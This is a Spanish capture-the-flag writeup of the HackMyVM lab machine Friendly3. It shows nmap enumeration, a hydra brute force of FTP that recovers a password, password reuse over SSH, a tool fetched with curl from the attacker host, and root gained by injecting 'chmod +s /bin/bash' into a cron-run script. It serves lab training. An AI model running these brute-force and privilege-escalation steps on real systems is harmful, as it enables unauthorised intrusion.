---
date: 2023-08-05 12:00:00
layout: post
title: Friendly3 Writeup
subtitle: Writeup de la máquina Friendly3 de la plataforma HackMyVm
description: En esta máquina nos aprovechamos de información expuesta que utilizamos para ejecutar un bruteforce. Además de reutilizar una clave en otro servicio. Esta máquina tiene una dificultad easy y fue hecha por Rijaba1.
image: /assets/img/machines/Friendly3/Friendly3.png
optimized_image: /assets/img/machines/Friendly3/Friendly3.png
category: Writeup
tags:
  - HackMyVm
  - Writeup
  - Easy
  - Linux
  - Password Reuse
  - Bruteforce
  - Information Disclosure
author: FredBrave
---
# Enumeración
Primero empezamos tratando de encontrar la ip de la máquina dentro de nuestro segmento de red.

```bash
❯ sudo arp-scan 10.0.2.0/24
Interface: eth0, type: EN10MB, MAC: 08:00:27:53:0c:ba, IPv4: 10.0.2.133
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:68:69:ef       PCS Systemtechnik GmbH
10.0.2.15       08:00:27:68:0e:b5       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.006 seconds (127.62 hosts/sec). 4 responded
```

Una vez encontrado realizamos dos escaneos hacia esta con nmap. Uno rápido para encontrar los puertos abiertos y el segundo más exhaustivo hacia los puertos abiertos para encontrar versiones.

```bash
❯ sudo nmap -p- --open -sS --min-rate 2000 -n -Pn 10.0.2.15 -oG Targeted
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-05 12:11 EDT
Nmap scan report for 10.0.2.15
Host is up (0.00011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:68:0E:B5 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.46 seconds
❯ sudo nmap -p21,22,80 -sCV 10.0.2.15 -oN Target
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-05 12:11 EDT
Nmap scan report for 10.0.2.15
Host is up (0.00048s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 bc:46:3d:85:18:bf:c7:bb:14:26:9a:20:6c:d3:39:52 (ECDSA)
|_  256 7b:13:5a:46:a5:62:33:09:24:9d:3e:67:b6:eb:3f:a1 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.22.1
MAC Address: 08:00:27:68:0E:B5 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.92 seconds
```
Tenemos tres puertos abiertos, el ftp no parece tener el usuario anónimo activado por lo que prosigo a enumerar el puerto 80.

# Puerto 80

Al buscar el puerto 80 en el navegador me encuentro con lo siguiente:

<img class="img" src="/assets/img/machines/Friendly3/1.png" width="1200">

Trato de encontrar más rutas dentro del servidor web, pero no encuentro nada más. Lo único que tenemos es el mensaje de la ruta principal.

<img class="img" src="/assets/img/machines/Friendly3/2.png" width="800">

Este nos indica que el usuario juan ha subido nuevos archivos al servidor ftp. De esto sacamos un posible usuario del sistema y como no hay mucho más empiezo a tratar de bruteforcear el servidor ftp en busca de la clave de juan.

# Puerto 21

```bash
❯ hydra ftp://10.0.2.15 -l juan -P /usr/share/wordlists/rockyou.txt -t 30 -f
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-05 12:29:50
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task
[DATA] attacking ftp://10.0.2.15:21/
[21][ftp] host: 10.0.2.15   login: juan   password: alexis
[STATUS] attack finished for 10.0.2.15 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-05 12:30:07
```
Encontramos la clave de juan por lo que prosigo a entrar al servicio ftp.

```bash
❯ ftp 10.0.2.15
Connected to 10.0.2.15.
220 (vsFTPd 3.0.3)
Name (10.0.2.15:kali): juan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
Este contenía varias carpetas y archivos luego de una inspección rápida encuentro los siguientes archivos y los descargo.

```bash
❯ /usr/bin/ls
file80  fold8  fole32  passwd.txt  yt.txt
```
Ninguno tiene información importante.

```bash
❯ /usr/bin/cat *
Hi, I'm the sysadmin. I am bored...
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabba
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠛⠛⠛⠿⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⡀⠠⠤⠒⢂⣉⣉⣉⣑⣒⣒⠒⠒⠒⠒⠒⠒⠒⠀⠀⠐⠒⠚⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⡠⠔⠉⣀⠔⠒⠉⣀⣀⠀⠀⠀⣀⡀⠈⠉⠑⠒⠒⠒⠒⠒⠈⠉⠉⠉⠁⠂⠀⠈⠙⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠔⠁⠠⠖⠡⠔⠊⠀⠀⠀⠀⠀⠀⠀⠐⡄⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠉⠲⢄⠀⠀⠀⠈⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠊⠀⢀⣀⣤⣤⣤⣤⣀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠜⠀⠀⠀⠀⣀⡀⠀⠈⠃⠀⠀⠀⠸⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠥⠐⠂⠀⠀⠀⠀⡄⠀⠰⢺⣿⣿⣿⣿⣿⣟⠀⠈⠐⢤⠀⠀⠀⠀⠀⠀⢀⣠⣶⣾⣯⠀⠀⠉⠂⠀⠠⠤⢄⣀⠙⢿⣿⣿
⣿⡿⠋⠡⠐⠈⣉⠭⠤⠤⢄⡀⠈⠀⠈⠁⠉⠁⡠⠀⠀⠀⠉⠐⠠⠔⠀⠀⠀⠀⠀⠲⣿⠿⠛⠛⠓⠒⠂⠀⠀⠀⠀⠀⠀⠠⡉⢢⠙⣿
⣿⠀⢀⠁⠀⠊⠀⠀⠀⠀⠀⠈⠁⠒⠂⠀⠒⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⣀⡠⠔⠒⠒⠂⠀⠈⠀⡇⣿
⣿⠀⢸⠀⠀⠀⢀⣀⡠⠋⠓⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠈⠢⠤⡀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⡠⠀⡇⣿
⣿⡀⠘⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠈⠑⡦⢄⣀⠀⠀⠐⠒⠁⢸⠀⠀⠠⠒⠄⠀⠀⠀⠀⠀⢀⠇⠀⣀⡀⠀⠀⢀⢾⡆⠀⠈⡀⠎⣸⣿
⣿⣿⣄⡈⠢⠀⠀⠀⠀⠘⣶⣄⡀⠀⠀⡇⠀⠀⠈⠉⠒⠢⡤⣀⡀⠀⠀⠀⠀⠀⠐⠦⠤⠒⠁⠀⠀⠀⠀⣀⢴⠁⠀⢷⠀⠀⠀⢰⣿⣿
⣿⣿⣿⣿⣇⠂⠀⠀⠀⠀⠈⢂⠀⠈⠹⡧⣀⠀⠀⠀⠀⠀⡇⠀⠀⠉⠉⠉⢱⠒⠒⠒⠒⢖⠒⠒⠂⠙⠏⠀⠘⡀⠀⢸⠀⠀⠀⣿⣿⣿
⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠑⠄⠰⠀⠀⠁⠐⠲⣤⣴⣄⡀⠀⠀⠀⠀⢸⠀⠀⠀⠀⢸⠀⠀⠀⠀⢠⠀⣠⣷⣶⣿⠀⠀⢰⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠁⢀⠀⠀⠀⠀⠀⡙⠋⠙⠓⠲⢤⣤⣷⣤⣤⣤⣤⣾⣦⣤⣤⣶⣿⣿⣿⣿⡟⢹⠀⠀⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠑⠀⢄⠀⡰⠁⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠻⠋⠉⠛⢛⠉⠉⢹⠁⢀⢇⠎⠀⠀⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠈⠢⢄⡉⠂⠄⡀⠀⠈⠒⠢⠄⠀⢀⣀⣀⣰⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⢀⣎⠀⠼⠊⠀⠀⠀⠘⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠉⠢⢄⡈⠑⠢⢄⡀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⢀⠀⠀⠀⠀⠀⢻⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⡈⠑⠢⢄⡀⠈⠑⠒⠤⠄⣀⣀⠀⠉⠉⠉⠉⠀⠀⠀⣀⡀⠤⠂⠁⠀⢀⠆⠀⠀⢸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀⠁⠉⠒⠂⠤⠤⣀⣀⣉⡉⠉⠉⠉⠉⢀⣀⣀⡠⠤⠒⠈⠀⠀⠀⠀⣸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣤⣤⣤⣤⣀⣀⣤⣤⣤⣶⣾⣿⣿⣿⣿⣿
Thanks to all my YT subscribers!
```
# Shell como juan

Al no conseguir nada importante en el ftp intento reusar la credencial de juan en el otro servicio abierto ssh.

```bash
❯ ssh juan@10.0.2.15
juan@10.0.2.15's password: 
Linux friendly3 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Aug  5 12:41:36 2023 from 10.0.2.133
-bash-5.2$ whoami
juan
```
# Shell como root

En la enumeración no encuentro mucho así que prosigo tratando de encontrar tareas que se ejecuten cada cierto tiempo. Esto lo hago con <a href="https://github.com/DominicBreuker/pspy">pspy</a>

Lo descargo en la máquina víctima y lo ejecuto.

```bash
❯ /usr/bin/ls
pspy64
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

...

-bash-5.2$ cd /tmp
-bash-5.2$ ls
systemd-private-bee6ccfca089434ba689f729f9a5611f-systemd-logind.service-8UP4Xk
-bash-5.2$ curl -X GET http://10.0.2.133/pspy64 -o pspy64
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3032k  100 3032k    0     0  64.7M      0 --:--:-- --:--:-- --:--:-- 65.7M
-bash-5.2$ ls
pspy64  systemd-private-bee6ccfca089434ba689f729f9a5611f-systemd-logind.service-8UP4Xk
-bash-5.2$ chmod +x pspy64
```

Después de esperar un poco encuentro que cada minuto me ejecuta el siguiente script.

```bash
2023/08/05 12:49:01 CMD: UID=0     PID=1800   | /bin/bash /opt/check_for_install.sh 
```

```bash
-bash-5.2$ ls -la /opt/check_for_install.sh 
-rwxr-xr-x 1 root root 190 Jun 25 03:34 /opt/check_for_install.sh
-bash-5.2$ cat /opt/check_for_install.sh 
#!/bin/bash


/usr/bin/curl "http://127.0.0.1/9842734723948024.bash" > /tmp/a.bash

chmod +x /tmp/a.bash
chmod +r /tmp/a.bash
chmod +w /tmp/a.bash

/bin/bash /tmp/a.bash

rm -rf /tmp/a.bash
```
Analizando el script podemos ver que ejecuta un curl hacia el mismo web server a un archivo llamado `9842734723948024.bash` descargándolo y guardando dicho archivo como `/tmp/a.bash` luego prosigue a darle todos los permisos hasta que lo ejecuta y lo borra.

Esto me da la idea de ejecutar un script de manera indefinida el cual agregue contenido a este archivo `a.bash`  para que ejecute comandos nuestros. Creamos el script.

```bash
-bash-5.2$ nano a.sh 
-bash-5.2$ chmod +x a.sh
-bash-5.2$ cat a.sh
#!/bin/bash

while true :
do
    echo "chmod +s /bin/bash" >> /tmp/a.bash
done
-bash-5.2$ ./a.sh
```

Lo dejamos asi por uno o dos minutos y deberiamos tener el permiso s en `/bin/bash`

```bash
-bash-5.2$ ./a.sh
^C
-bash-5.2$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 23 17:23 /bin/bash
-bash-5.2$ bash -p
bash-5.2# whoami
root
```
Hemos pwneado la maquina!
